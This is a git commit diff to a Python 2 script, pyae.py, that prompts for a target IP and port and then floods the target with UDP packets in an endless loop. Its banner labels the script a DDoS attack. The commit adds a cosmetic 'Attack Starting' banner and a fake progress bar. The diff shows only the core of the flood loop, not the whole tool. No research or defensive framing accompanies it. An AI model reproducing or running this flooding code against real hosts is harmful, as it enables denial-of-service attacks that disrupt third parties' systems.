7aa721d899029bbfe6774bea18fc74ac58f0c00f
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-02-23 00:40:07 +0630

    Update pyae.py

--- pyae.py
+++ pyae.py
@@ -24,10 +24,18 @@ print "Auto :Pyae Sone Hmoo"
 print
 ip = raw_input("Target IP : ")
 port = input("Port      : ")
-
 os.system("clear")
-os.system("figlet DDOS ATTACKED")
-time.sleep(7)
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
